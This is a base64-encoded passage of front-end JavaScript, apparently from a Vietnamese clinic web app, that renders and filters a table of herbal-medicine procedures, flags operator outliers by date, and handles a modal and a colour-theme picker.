oYSwgYikgPT4gew0KICAgICAgICAgICAgY29uc3QgW2RhLCBtYSwgeWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgY29uc3QgW2RiLCBtYiwgeWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLCBtYSAtIDEsIGRhKSAtIG5ldyBEYXRlKHliLCBtYiAtIDEsIGRiKTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3QgdW5pcXVlRG9jdG9ycyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoID0+IGguZG9jdG9yIHx8ICdLaMO0bmcgY8OzJykpXS5zb3J0KCk7DQoNCiAgICAgICAgZGF0ZUZpbHRlci5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICB1bmlxdWVEYXRlcy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIGRvY3RvckZpbHRlci5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIGLDoWMgc8SpPC9vcHRpb24+JyArDQogICAgICAgICAgICB1bmlxdWVEb2N0b3JzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkID0gInRydWUiOw0KICAgICAgICBkYXRlRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHJlbmRlckhlcmJMaXN0KTsNCiAgICAgICAgZG9jdG9yRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHJlbmRlckhlcmJMaXN0KTsNCiAgICB9DQoNCiAgICBjb25zdCBzZWxlY3RlZERhdGUgPSBkYXRlRmlsdGVyLnZhbHVlOw0KICAgIGNvbnN0IHNlbGVjdGVkRG9jdG9yID0gZG9jdG9yRmlsdGVyLnZhbHVlOw0KDQogICAgY29uc3QgZmlsdGVyZWRIZXJicyA9IGhlcmJzLmZpbHRlcihwID0+DQogICAgICAgIChzZWxlY3RlZERhdGUgPT09ICdhbGwnIHx8IHAuZGF0ZSA9PT0gc2VsZWN0ZWREYXRlKSAmJg0KICAgICAgICAoc2VsZWN0ZWREb2N0b3IgPT09ICdhbGwnIHx8IHAuZG9jdG9yID09PSBzZWxlY3RlZERvY3RvcikNCiAgICApOw0KDQogICAgaWYgKGZpbHRlcmVkSGVyYnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYDx0ZCBjb2xzcGFuPSI1Ij48Y2VudGVyPktow7RuZyBjw7MgZOG7ryBsaeG7h3Ugc+G6r2MgdGh14buRYyB0aGFuZzwvY2VudGVyPjwvdGQ+YDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGZpbHRlcmVkSGVyYnMuZm9yRWFjaChwID0+IHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8dGQ+JHtwLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7cC5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAtPiAke3AuZGlzcGxheUVuZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cC5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICBgOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0pOw0KfQ0KDQoNCmZ1bmN0aW9uIHRvZ2dsZUhlcmJMaXN0KCkgew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJQcm9jZWR1cmVUYWJsZScpOw0KICAgIGlmICh0YWJsZS5zdHlsZS5kaXNwbGF5ID09PSAnbm9uZScpIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHJlbmRlckhlcmJMaXN0KCk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgdGFibGUuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICB9DQp9DQo8L3NjcmlwdD4NCg0KDQoNCjxzY3JpcHQ+DQooZnVuY3Rpb24oKXsNCiAgLyogPT09PSBUSeG7hk4gw41DSCBDSFXhuqhOIEhPw4EgVMOKTiA9PT09ICovDQogIGZ1bmN0aW9uIGNsZWFuRGlzcGxheShuYW1lKXsNCiAgICByZXR1cm4gKG5hbWV8fCcnKQ0KICAgICAgLnRvU3RyaW5nKCkNCiAgICAgIC5yZXBsYWNlKC9bLO+8jF0rXHMqJC8sJycpDQogICAgICAucmVwbGFjZSgvXHMrL2csJyAnKQ0KICAgICAgLnRyaW0oKTsNCiAgfQ0KICBmdW5jdGlvbiBub3JtKG5hbWUpew0KICAgIHJldHVybiBjbGVhbkRpc3BsYXkobmFtZSkudG9Mb3dlckNhc2UoKTsNCiAgfQ0KDQogIC8qID09PT0gVMONTkggxJBBIFPhu5AgVEhFTyBOR8OAWSA9PT09ICovDQogIGZ1bmN0aW9uIGNvbXB1dGVNYWpvcml0eUJ5RGF0ZShyb3dzKXsNCiAgICBjb25zdCBtYXAgPSBPYmplY3QuY3JlYXRlKG51bGwpOw0KICAgIHJvd3MuZm9yRWFjaChyPT57DQogICAgICBjb25zdCBkID0gci5kYXRlOw0KICAgICAgY29uc3QgbiA9IG5vcm0oci5vcGVyYXRvcik7DQogICAgICBpZighbiB8fCBuID09PSAna2jDtG5nIGPDsycpIHJldHVybjsNCiAgICAgIChtYXBbZF18fChtYXBbZF09e30pKVtuXSA9IChtYXBbZF1bbl18fDApKzE7DQogICAgfSk7DQogICAgY29uc3Qgb3V0ID0ge307DQogICAgT2JqZWN0LmtleXMobWFwKS5mb3JFYWNoKGQ9PnsNCiAgICAgIGNvbnN0IGFyciA9IE9iamVjdC5lbnRyaWVzKG1hcFtkXSkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICAgIGNvbnN0IHRvcCA9IGFyclswXSB8fCBbbnVsbCwwXTsNCiAgICAgIGNvbnN0IHNlY29uZCA9IGFyclsxXSB8fCBbbnVsbCwwXTsNCiAgICAgIG91dFtkXSA9IHsgdG9wTm9ybTp0b3BbMF0sIHRvcENvdW50OnRvcFsxXSwgc2Vjb25kQ291bnQ6c2Vjb25kWzFdIH07DQogICAgfSk7DQogICAgcmV0dXJuIG91dDsNCiAgfQ0KDQogIC8qID09PT0gVUkgUEjhu6Q6IFTDk00gVOG6rlQgKyBQT1BVUCA9PT09ICovDQogIGZ1bmN0aW9uIGVuc3VyZU91dGxpZXJVSSgpew0KICAgIGNvbnN0IHN1bW1hcnkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJTdW1tYXJ5Jyk7DQogICAgY29uc3QgbW9kYWwgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsJyk7DQogICAgaWYoIXN1bW1hcnkpIGNvbnNvbGUud2FybignVGhp4bq/dSAjaGVyYk91dGxpZXJTdW1tYXJ5IHRyb25nIEhUTUwhJyk7DQogICAgaWYoIW1vZGFsKSAgIGNvbnNvbGUud2FybignVGhp4bq/dSAjaGVyYk91dGxpZXJNb2RhbCB0cm9uZyBIVE1MIScpOw0KICAgIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckNsb3NlQnRuJyk7DQogICAgY29uc3QgYmFja2Ryb3AgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJCYWNrZHJvcCcpOw0KICAgIGlmKGJ0bikgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9Pm1vZGFsLnN0eWxlLmRpc3BsYXk9J25vbmUnKTsNCiAgICBpZihiYWNrZHJvcCkgYmFja2Ryb3AuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKT0+bW9kYWwuc3R5bGUuZGlzcGxheT0nbm9uZScpOw0KICB9DQogIGVuc3VyZU91dGxpZXJVSSgpOw0KDQogIC8qID09PT0gR0hJIMSQw4ggSMOATSBSRU5ERVIgPT09PSAqLw0KLyogPT09PSBHSEkgxJDDiCBIw4BNIFJFTkRFUiA9PT09ICovDQoNCi8vIGhlbHBlcjogdHLhuqMgduG7gSBkYW5oIHPDoWNoIG5nw6B5IGPDsyBjYSBz4bqvYyB0aHXhu5FjIGzhu5dpDQpmdW5jdGlvbiBnZXRIZXJiRXJyb3JEYXRlcyhhbGxIZXJicyl7DQogIGNvbnN0IG1ham9yaXR5ID0gY29tcHV0ZU1ham9yaXR5QnlEYXRlKGFsbEhlcmJzKTsNCiAgY29uc3QgZGF0ZXMgPSBuZXcgU2V0KCk7DQoNCiAgYWxsSGVyYnMuZm9yRWFjaChoPT57DQogICAgY29uc3QgbSA9IG1ham9yaXR5W2guZGF0ZV07DQogICAgY29uc3QgaGFzTWFqb3JpdHkgPSBtICYmIG0udG9wTm9ybSAmJiBtLnRvcENvdW50ID4gbS5zZWNvbmRDb3VudDsNCiAgICBpZihoYXNNYWpvcml0eSAmJiBoLm9wTm9ybSAhPT0gbS50b3BOb3JtKXsNCiAgICAgIGRhdGVzLmFkZChoLmRhdGUpOw0KICAgIH0NCiAgfSk7DQoNCiAgcmV0dXJuIEFycmF5LmZyb20oZGF0ZXMpOw0KfQ0KDQp3aW5kb3cucmVuZGVySGVyYkxpc3QgPSBmdW5jdGlvbigpew0KICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVGFibGVCb2R5Jyk7DQogIGNvbnN0IGRhdGVGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgY29uc3QgZG9jdG9yRmlsdGVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJEb2N0b3JGaWx0ZXInKTsNCiAgY29uc3Qgc3VtbWFyeURpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllclN1bW1hcnknKTsNCiAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbCcpOw0KICBjb25zdCBtb2RhbEJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbEJvZHknKTsNCiAgY29uc3QgbW9kYWxJbmZvID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWxJbmZvJyk7DQogIGNvbnN0IG9ubHlFcnJvckRheXNDYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93SGVyYkVycm9yRGF5c0NoZWNrYm94Jyk7DQoNCiAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgY29uc3QgaGVyYnNSYXcgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW107DQogIGxldCBoZXJicyA9IGhlcmJzUmF3Lm1hcChoPT4oew0KICAgIC4uLmgsDQogICAgb3BDbGVhbjogY2xlYW5EaXNwbGF5KGgub3BlcmF0b3IpLA0KICAgIG9wTm9ybTogbm9ybShoLm9wZXJhdG9yKQ0KICB9KSk7DQoNCiAgLy8gbuG6v3UgY2hlY2tib3ggYuG6rXQgdGjDrCBs4buNYyBs4bqhaSBoZXJicyBjaOG7iSBjw7JuIG5o4buvbmcgbmfDoHkgY8OzIGzhu5dpDQogIGlmKG9ubHlFcnJvckRheXNDYiAmJiBvbmx5RXJyb3JEYXlzQ2IuY2hlY2tlZCl7DQogICAgY29uc3QgZXJyb3JEYXRlcyA9IGdldEhlcmJFcnJvckRhdGVzKGhlcmJzKTsNCiAgICBoZXJicyA9IGhlcmJzLmZpbHRlcihoID0+IGVycm9yRGF0ZXMuaW5jbHVkZXMoaC5kYXRlKSk7DQogICAgaWYoc3VtbWFyeURpdil7DQogICAgICBpZihlcnJvckRhdGVzLmxlbmd0aCl7DQogICAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MID0gYDxiPsSQYW5nIGhp4buDbiB0aOG7iyBjw6FjIG5nw6B5IGPDsyBs4buXaSBz4bqvYyB0aHXhu5FjOjwvYj4gJHtlcnJvckRhdGVzLmpvaW4oJywgJyl9YDsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUwgPSAnJzsNCiAgICAgIH0NCiAgICB9DQogIH0NCg0KICAvLyBraOG7n2kgdOG6oW8gc2VsZWN0IG7hur91IGNoxrBhDQogIGlmKCFkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQpew0KICAgIGNvbnN0IHVuaXF1ZURhdGVzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGg9PmguZGF0ZSkpXS5zb3J0KChhLGIpPT57DQogICAgICBjb25zdCBbZGEsbWEseWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgY29uc3QgW2RiLG1iLHliXSA9IGIuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSxtYS0xLGRhKSAtIG5ldyBEYXRlKHliLG1iLTEsZGIpOw0KICAgIH0pOw0KICAgIGNvbnN0IHVuaXF1ZURvY3RvcnMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaD0+aC5kb2N0b3J8fCdLaMO0bmcgY8OzJykpXS5zb3J0KCk7DQogICAgZGF0ZUZpbHRlci5pbm5lckhUTUwgPQ0KICAgICAgJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgdW5pcXVlRGF0ZXMubWFwKGQ9PmA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgZG9jdG9yRmlsdGVyLmlubmVySFRNTCA9DQogICAgICAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIGLDoWMgc8SpPC9vcHRpb24+JyArDQogICAgICB1bmlxdWVEb2N0b3JzLm1hcChkPT5gPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIGRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCiAgICBkYXRlRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgZG9jdG9yRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgaWYob25seUVycm9yRGF5c0NiKXsNCiAgICAgIG9ubHlFcnJvckRheXNDYi5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB3aW5kb3cucmVuZGVySGVyYkxpc3QpOw0KICAgIH0NCiAgfQ0KDQogIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRhdGVGaWx0ZXIudmFsdWU7DQogIGNvbnN0IHNlbGVjdGVkRG9jdG9yID0gZG9jdG9yRmlsdGVyLnZhbHVlOw0KDQogIGNvbnN0IGZpbHRlcmVkID0gaGVyYnMuZmlsdGVyKHAgPT4NCiAgICAoc2VsZWN0ZWREYXRlID09PSAnYWxsJyB8fCBwLmRhdGUgPT09IHNlbGVjdGVkRGF0ZSkgJiYNCiAgICAoc2VsZWN0ZWREb2N0b3IgPT09ICdhbGwnIHx8IHAuZG9jdG9yID09PSBzZWxlY3RlZERvY3RvcikNCiAgKTsNCg0KICBpZihmaWx0ZXJlZC5sZW5ndGggPT09IDApew0KICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICB0ci5jbGFzc05hbWUgPSAnaGVyYi1yb3cnOw0KICAgIHRyLmlubmVySFRNTCA9ICc8dGQgY29sc3Bhbj0iNSI+PGNlbnRlcj5LaMO0bmcgY8OzIGThu68gbGnhu4d1IHPhuq9jIHRodeG7kWMgdGhhbmc8L2NlbnRlcj48L3RkPic7DQogICAgdGJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICAgIGlmKHN1bW1hcnlEaXYpIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgY29uc3QgbWFqb3JpdHkgPSBjb21wdXRlTWFqb3JpdHlCeURhdGUoaGVyYnMpOw0KICBjb25zdCBvdXRsaWVyc0luVmlldyA9IFtdOw0KDQogIGZpbHRlcmVkLmZvckVhY2gocD0+ew0KICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICB0ci5jbGFzc05hbWUgPSAnaGVyYi1yb3cnOw0KICAgIGNvbnN0IG0gPSBtYWpvcml0eVtwLmRhdGVdOw0KICAgIGNvbnN0IGhhc01ham9yaXR5ID0gbSAmJiBtLnRvcE5vcm0gJiYgbS50b3BDb3VudCA+IG0uc2Vjb25kQ291bnQ7DQogICAgaWYoaGFzTWFqb3JpdHkgJiYgcC5vcE5vcm0gIT09IG0udG9wTm9ybSl7DQogICAgICB0ci5jbGFzc0xpc3QuYWRkKCdoZXJiLW91dGxpZXInKTsNCiAgICAgIG91dGxpZXJzSW5WaWV3LnB1c2gocCk7DQogICAgfQ0KICAgIHRyLmlubmVySFRNTCA9IGANCiAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke3AucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtwLnBhdGllbnRJZH08L3RkPg0KICAgICAgPHRkPiR7cC5wcm9jZWR1cmV9PC90ZD4NCiAgICAgIDx0ZD4ke3AuZGF0ZX08L3RkPg0KICAgICAgPHRkPiR7cC5kaXNwbGF5U3RhcnR9ICZyYXJyOyAke3AuZGlzcGxheUVuZH08L3RkPg0KICAgICAgPHRkPiR7cC5vcENsZWFufTwvdGQ+DQogICAgYDsNCiAgICB0Ym9keS5hcHBlbmRDaGlsZCh0cik7DQogIH0pOw0KDQogIGlmKHN1bW1hcnlEaXYgJiYgKCFvbmx5RXJyb3JEYXlzQ2IgfHwgIW9ubHlFcnJvckRheXNDYi5jaGVja2VkKSl7DQogICAgaWYob3V0bGllcnNJblZpZXcubGVuZ3RoKXsNCiAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheT0nYmxvY2snOw0KICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUwgPQ0KICAgICAgICBgPGEgaHJlZj0iIyIgaWQ9ImhlcmJPdXRsaWVyQ291bnRMaW5rIj5Dw7MgJHtvdXRsaWVyc0luVmlldy5sZW5ndGh9IGNhIGPDsyB24bqlbiDEkeG7gSB0cm9uZyBkYW5oIHPDoWNoIG7DoHkuPC9hPmA7DQogICAgICBjb25zdCBsaW5rID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQ291bnRMaW5rJyk7DQogICAgICBsaW5rLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZXYpew0KICAgICAgICBldi5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICBpZihtb2RhbEJvZHkpew0KICAgICAgICAgIG1vZGFsQm9keS5pbm5lckhUTUwgPSAnJzsNCiAgICAgICAgICBvdXRsaWVyc0luVmlldy5mb3JFYWNoKHA9PnsNCiAgICAgICAgICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgIHRyLmlubmVySFRNTCA9IGANCiAgICAgICAgICAgICAgPHRkPiR7cC5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7cC5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke3AucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3AuZGF0ZX08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLmRpc3BsYXlTdGFydH0gJnJhcnI7ICR7cC5kaXNwbGF5RW5kfTwvdGQ+DQogICAgICAgICAgICAgIDx0ZD4ke3Aub3BDbGVhbn08L3RkPg0KICAgICAgICAgICAgYDsNCiAgICAgICAgICAgIG1vZGFsQm9keS5hcHBlbmRDaGlsZCh0cik7DQogICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgaWYobW9kYWxJbmZvKXsNCiAgICAgICAgICBjb25zdCBub3RlRGF0ZSA9IChzZWxlY3RlZERhdGU9PT0nYWxsJykgPyAnbmhp4buBdSBuZ8OgeScgOiBzZWxlY3RlZERhdGU7DQogICAgICAgICAgbW9kYWxJbmZvLnRleHRDb250ZW50ID0gYFThu5VuZyAke291dGxpZXJzSW5WaWV3Lmxlbmd0aH0gY2Ega2jDoWMgxJFhIHPhu5EgKCR7bm90ZURhdGV9KS5gOw0KICAgICAgICB9DQogICAgICAgIGlmKG1vZGFsKSBtb2RhbC5zdHlsZS5kaXNwbGF5PSdibG9jayc7DQogICAgICB9LCB7b25jZTp0cnVlfSk7DQogICAgfSBlbHNlIHsNCiAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheT0nbm9uZSc7DQogICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTD0nJzsNCiAgICB9DQogIH0NCn07DQoNCg0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCk9PnsNCiAgICBjb25zdCB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiUHJvY2VkdXJlVGFibGUnKTsNCiAgICBpZih0YWJsZSAmJiB0YWJsZS5zdHlsZS5kaXNwbGF5ICE9PSAnbm9uZScpew0KICAgICAgd2luZG93LnJlbmRlckhlcmJMaXN0KCk7DQogICAgfQ0KICB9KTsNCn0pKCk7DQoNCg0KDQoNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQogICAgY29uc3QgYW5hbHl6ZUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgaWYgKGZpbGVJbnB1dCAmJiBhbmFseXplQnRuKSB7DQogICAgICBmaWxlSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24gKCkgew0KICAgICAgICBhbmFseXplQnRuLmNsaWNrKCk7DQogICAgICB9KTsNCiAgICB9DQogIH0pOw0KPC9zY3JpcHQ+DQoNCg0KPCEtLSBUSEVNRSBQSUNLRVIgU0NSSVBUIC0tPg0KPHNjcmlwdD4NCihmdW5jdGlvbigpew0KICBjb25zdCBUSEVNRV9LRVkgPSAndWlBY2NlbnRUaGVtZSc7DQogIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5ib2R5Ow0KICBjb25zdCBwaWNrZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGhlbWVQaWNrZXInKTsNCiAgaWYoIXBpY2tlcikgcmV0dXJuOw0KICBmdW5jdGlvbiBhcHBseVRoZW1lKHQpew0KICAgIGJvZHkuY2xhc3NMaXN0LnJlbW92ZSgndGhlbWUtZGVmYXVsdCcsJ3RoZW1lLW9yYW5nZScsJ3RoZW1lLXJlZCcsJ3RoZW1lLWdyZWVuJyk7DQogICAgaWYodCAmJiB0ICE9PSAnZGVmYXVsdCcpew0KICAgICAgYm9keS5jbGFzc0xpc3QuYWRkKCd0aGVtZS0nK3QpOw0KICAgIH0gZWxzZSB7DQogICAgICBib2R5LmNsYXNzTGlzdC5hZGQoJ3RoZW1lLWRlZmF1bHQnKTsgLy8gZXhwbGljaXQgxJHhu4MgYWN0aXZlIHJpbmcNCiAgICB9DQogICAgcGlja2VyLnF1ZXJ5U2VsZWN0b3JBbGwoJy50aGVtZS1zd2F0Y2gnKS5mb3JFYWNoKGJ0bj0+ew0KICAgICAgYnRuLmNsYXNzTGlzdC50b2dnbGUoJ2lzLWFjdGl2ZScsIGJ0bi5kYXRhc2V0LnRoZW1lPT09dCB8fCAodD09PScnICYmIGJ0bi5kYXRhc2V0LnRoZW1lPT09J2RlZmF1bHQnKSk7DQogICAgfSk7DQogICAgdHJ5eyBsb2NhbFN0b3JhZ2Uuc2V0SXRlbShUSEVNRV9LRVksdHx8J2RlZmF1bHQnKTsgfWNhdGNoKGUpe30NCiAgfQ0KICBjb25zdCBzYXZlZCA9IChmdW5jdGlvbigpe3RyeXtyZXR1cm4gbG9jYWxTdG9yYWdlLmdldEl0ZW0oVEhFTUVfS0VZKSB8fCAnZGVmYXVsdCc7fWNhdGNoKGUpe3JldHVybiAnZGVmYXVsdCc7fX0pKCk7DQogIGFwcGx5VGhlbWUoc2F2ZWQpOw0KICBwaWNrZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLGU9PnsNCiAgICBjb25zdCBidG4gPSBlLnRhcmdldC5jbG9zZXN0KCcudGhlbWUtc3dhdGNoJyk7DQogICAgaWYoIWJ0bikgcmV0dXJuOw0KICAgIGFwcGx5VGhlbWUoYnRuLmRhdGFzZXQudGhlbWUpOw0KICB9KTsNCn0pKCk7DQo8L3NjcmlwdD4NCg0KPHNjcmlwdD4NCmZ1bmN0aW9uIHVwZGF0ZUhlcmJCdXR0b25XaXRoT3V0bGllckNvdW50KCkgew0KICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRvZ2dsZUJ0bicpOw0KICBpZiAoIWJ0biB8fCAhd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzKSByZXR1cm47DQoNCiAgY29uc3QgaGVyYnMgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXM7DQogIGNvbnN0IGNvdW50cyA9IHt9Ow0KDQogIGhlcmJzLmZvckVhY2goaCA9PiB7DQogICAgY29uc3QgZGF0ZSA9IGguZGF0ZTsNCiAgICBjb25zdCBrZXkgPSBkYXRlOw0KICAgIGlmICghY291bnRzW2tleV0pIGNvdW50c1trZXldID0ge307DQogICAgY29uc3QgbmFtZSA9IChoLm9wZXJhdG9yIHx8ICdLaMO0bmcgY8OzJykudHJpbSgpLnRvTG93ZXJDYXNlKCk7DQogICAgY291bnRzW2tleV1bbmFtZV0gPSAoY291bnRzW2tleV1bbmFtZV0gfHwgMCkgKyAxOw0KICB9KTsNCg0KICBsZXQgb3V0bGllckNvdW50ID0gMDsNCg0KICBPYmplY3Qua2V5cyhjb3VudHMpLmZvckVhY2goZGF0ZSA9PiB7DQogICAgY29uc3Qgb3BzID0gY291bnRzW2RhdGVdOw0KICAgIGNvbnN0IGVudHJpZXMgPSBPYmplY3QuZW50cmllcyhvcHMpLnNvcnQoKGEsIGIpID0+IGJbMV0gLSBhWzFdKTsNCiAgICBjb25zdCB0b3AgPSBlbnRyaWVzWzBdOw0KICAgIGlmICghdG9wKSByZXR1cm47DQoNCiAgICBjb25zdCB0b3BOYW1lID0gdG9wWzBdOw0KICAgIGNvbnN0IHRvcENvdW50ID0gdG9wWzFdOw0KDQogICAgZm9yIChjb25zdCBbbmFtZSwgY291bnRdIG9mIGVudHJpZXMpIHsNCiAgICAgIGlmIChuYW1lICE9PSB0b3BOYW1lICYmIGNvdW50ID4gMCkgew0KICAgICAgICBvdXRsaWVyQ291bnQgKz0gY291bnQ7DQogICAgICB9DQogICAgfQ0KICB9KTsNCg0KYnRuLmlubmVySFRNTCA9IGBT4bqvYyB0aHXhu5FjIHRoYW5nIDxpIGNsYXN